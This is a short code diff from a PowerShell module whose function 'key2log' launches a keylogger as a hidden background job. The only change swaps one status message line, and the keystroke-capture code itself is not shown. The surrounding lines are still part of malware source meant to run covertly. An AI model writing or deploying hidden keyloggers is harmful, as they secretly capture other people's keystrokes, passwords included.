@@ -354,7 +354,7 @@ function key2log {
         }
     }
     # Run keylogger as hidden process
-    Write-Host -NoNewline "keyllloger will be active for $DurationInSeconds seconds" -ForegroundColor DarkYellow
+    Write-output "keyllloger will be active for $DurationInSeconds seconds"
     Start-Job -ScriptBlock $scriptBlock -ArgumentList $DurationInSeconds | Out-Null
 }
 Export-ModuleMember -Function key2log
